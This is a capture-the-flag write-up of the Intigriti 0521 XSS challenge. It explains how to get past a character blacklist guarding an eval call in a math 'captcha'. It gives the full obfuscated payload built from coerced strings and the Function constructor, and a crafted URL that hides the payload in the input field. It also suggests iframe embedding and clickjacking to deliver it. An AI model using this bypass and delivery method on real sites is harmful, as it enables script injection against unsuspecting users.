# Intigriti 0521 XSS challenge

## Introduction and preconditions
This XSS challenge is about a capture that shall proof, that the user is not a robot. The task the user has to do is a simple calculation. The capture is embedded in an iframe and shows an equation like `123 + ___ = 124`. The user now has to calculate the number to fill in and submit it. If the equation is correct he is "obviously not a robot". The check of the user input is done in javascript. The aim of this challenge is to abuse the capture to create a cross-site scripting attack.

So let's have a look into the calculation function, that checks the equation:

``` javascript
function calc() {
    const operation = a.innerText + b.innerText + c.value;
    if (!operation.match(/[a-df-z<>()!\\='"]/gi)) { // Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant)
        if (d.innerText == eval(operation)) {
            alert("ðŸš«ðŸ¤– Congratulations, you're not a robot!");
        }
        else {
            alert("ðŸ¤– Sorry to break the news to you, but you are a robot!");
        }
        setNewNumber();
    }
    c.value = "";
}
```
So what we can see here is that an operation is build up (it contains the predefined number `a.innerText`, the operator `b.innerText` and the user provided number `c.value`). To prevent an XSS attack there is then a blacklist of characters. And if the operation doesn't contain any of these blacklisted characters, the operation is processed with an eval and compared to the predefined result `d.innerText`.

So it seems that to successfully perform the attack we will have to bypass the blacklist and abuse the `eval`-function. So the next step is to analyse which characters we have to play with:

* We can use backticks, curly brackets and the dollar sign. This allows at least some string literals
* We can use square brackets and numbers. This allows us to reference attributes of an object or index an array
* We can use the character e
* We can use operators like plus and minus
* We can use a dot to access attributes of an object
* We can use spaces

That's a lot to play with. So the first step will be to generate our payload string `alert(document.domain)`. To do that, we will take advantage of some auto-cast functionality of javascript. For example the result of `1/0` is `Infinity` and by adding some string to the result, javascript will convert that automatically into a string. So

``` javascript
1/0+`` => "Infinity"
```

We can now access single characters by just using that string as an array and index the character we want to have. But before that, we have to group it in any way. We are not allowed to use parentheses, but we have at least to other possibilities:

``` javascript
(1/0+``)[0]     // This would give as an "I", but doesn't pass the blacklist
[1/0+``][0][0]  // Would do the trick by grouping our string as element in an array. After that we can index the string itself and then the character
`${1/0}`[0]     // The usage of a string literal would also give us the string "Infinity" and we can use the square brackets to access the character we want
```

### Payload
Well, we have some possibilities to access single characters. Now we need to create strings that contain all the characters we need. We already have the string "Infinity", but we also need some characters like `r,d,o,...`. As a background: the browsers put all id and name attributes as property into the global namespace. Lucky us, there is an element with the id `e`:

``` html
<progress id="e" value="0" max="100" style="display:none"></progress>
```

Referencing it inside a string literal gives us the following string:

``` javascript
`${e}` => "[object HTMLProgressElement]"
```

Now we need also an `a` and some parentheses:

An `a` can be easily created by adding undefined to any number. That gives "NaN":

``` javascript
`${e[0]+1}` => "NaN"
```

This is a lot of characters. So let's have a look, if it's enough:

```
a `${e[0]+1}`[1]
l `${e}`[21]
e `${e}`[22]
r `${e}`[16]
t `${e}`[6]
( 
d `${e[`e`]}`[2]
o `${e}`[1]
c `${e}`[5]
u `${e[`e`]}`[0]
m `${e}`[23]
e `${e}`[22]
n `${e}`[25]
t `${e}`[6]
. `.`
d `${e[`e`]}`[2]
o `${e}`[1]
m `${e}`[23]
a `${e[0]+1}`[1]
i `${e[`e`]}`[5]
n `${e}`[25]
) 
```

Okay. We have everything but the parentheses. To get that, we have to create another string in two steps. We will need to reference any function to use that without actually calling it, so that javascript generates a string that contains parentheses:

``` javascript
// Let's look for a function
`${e["blur"]}` // gives us the string "function blur() {\n    [native code]\n}"

// Now we have to create "blur" as well
`${`${e}`[2]+`${e}`[21]+`${e[`e`]}`[0]+`${e}`[13]}` // gives us "blur"

// Putting it together:
`${e[`${`${e}`[2]+`${e}`[21]+`${e[`e`]}`[0]+`${e}`[13]}`]}` // gives us the string we need with only allowed characters

( `${e[`${`${e}`[2]+`${e}`[21]+`${e[`e`]}`[0]+`${e}`[13]}`]}`[13]
) `${e[`${`${e}`[2]+`${e}`[21]+`${e[`e`]}`[0]+`${e}`[13]}`]}`[14]
```

And now we have everything we need: concatenating all these snippets with a `+`, we can generate our payload `alert(document.domain)`. But what now? Throwing this expression into the `eval`-function, will just return the string. So we need a way to execute this string.

### Execution
I had to think a while to get an idea how to execute the payload. Then I remembered, that we already used a function: `e.blur`. We can also access properties with the square brackets. This allows us to access the function constructor. And looking at the documentation, this gives us a possibility to define a new function and provide a string that will be executed as function body: https://developer.mozilla.org/de/docs/Web/JavaScript/Reference/Global_Objects/Function

So we can use the function constructor in combination with tagged template-strings (https://developer.mozilla.org/de/docs/Web/JavaScript/Reference/Template_literals#tagged_template-strings)

``` javascript
// Basic example, that will pop an alert
Function`e${`alert(1)`}```
```

The first string literal sets the function body to `alert(1)` and the second calls the function.

Applying it to our payload and function would look like this:

``` javascript
e["blur"]["constructor"]`e${`alert(document.domain)`}```
```

Of course this is a simplified version, that wouldn't pass the blacklist. To bypass the blacklist we also have to create the string "constructor" like we did for the payload. I skip the process and just present the full payload:

``` javascript
e[`${e}`[2]+`${e}`[21]+`${e[`e`]}`[0]+`${e}`[16]][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[16]+`${e[`e`]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[16]]`e${`${e[0]+1}`[1]+`${e}`[21]+`${e}`[22]+`${e}`[16]+`${e}`[6]+`${e[`${`${e}`[2]+`${e}`[21]+`${e[`e`]}`[0]+`${e}`[13]}`]}`[13]+`${e[`e`]}`[2]+`${e}`[1]+`${e}`[5]+`${e[`e`]}`[0]+`${e}`[23]+`${e}`[22]+`${e}`[25]+`${e}`[6]+`.`+`${e[`e`]}`[2]+`${e}`[1]+`${e}`[23]+`${e[0]+1}`[1]+`${e[`e`]}`[5]+`${e}`[25]+`${e[`${`${e}`[2]+`${e}`[21]+`${e[`e`]}`[0]+`${e}`[13]}`]}`[14]}```
```

## Exploit
For now, we can put this payload into the input field and pop the alert box. But that's just self-XSS. That means we need to find a way, to execute this in the context of another user. There are at least to different possibilities:

* After trying some parameter names on the captcha.php endpoint, I found, that I can set the value of c. This is the user-input. So one way to make this XSS work, could be to just provide the payload as parameter c and prepending a lot of spaces and a +. This would make it unvisible in the limited input-box, so that if the user enters a value, it would just be inserted between the leading spaces.
  
```
https://challenge-0521.intigriti.io/captcha.php?c=++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%2Be[`%24{e}`[2]%2B`%24{e}`[21]%2B`%24{e[`e`]}`[0]%2B`%24{e}`[16]][`%24{e}`[5]%2B`%24{e}`[1]%2B`%24{e}`[25]%2B`%24{e}`[18]%2B`%24{e}`[6]%2B`%24{e}`[16]%2B`%24{e[`e`]}`[0]%2B`%24{e}`[5]%2B`%24{e}`[6]%2B`%24{e}`[1]%2B`%24{e}`[16]]`e%24{`%24{e[0]%2B1}`[1]%2B`%24{e}`[21]%2B`%24{e}`[22]%2B`%24{e}`[16]%2B`%24{e}`[6]%2B`%24{e[`%24{`%24{e}`[2]%2B`%24{e}`[21]%2B`%24{e[`e`]}`[0]%2B`%24{e}`[13]}`]}`[13]%2B`%24{e[`e`]}`[2]%2B`%24{e}`[1]%2B`%24{e}`[5]%2B`%24{e[`e`]}`[0]%2B`%24{e}`[23]%2B`%24{e}`[22]%2B`%24{e}`[25]%2B`%24{e}`[6]%2B`.`%2B`%24{e[`e`]}`[2]%2B`%24{e}`[1]%2B`%24{e}`[23]%2B`%24{e[0]%2B1}`[1]%2B`%24{e[`e`]}`[5]%2B`%24{e}`[25]%2B`%24{e[`%24{`%24{e}`[2]%2B`%24{e}`[21]%2B`%24{e[`e`]}`[0]%2B`%24{e}`[13]}`]}`[14]}```
```
Now this could be inserted into a malicious website as an iframe, tricking the user to enter a number and click the button

* The second possibility also uses the fact, that the captcha.php-endpoint can be embedded as an iframe. This could be used to combine the self-XSS with a clickjacking attack.
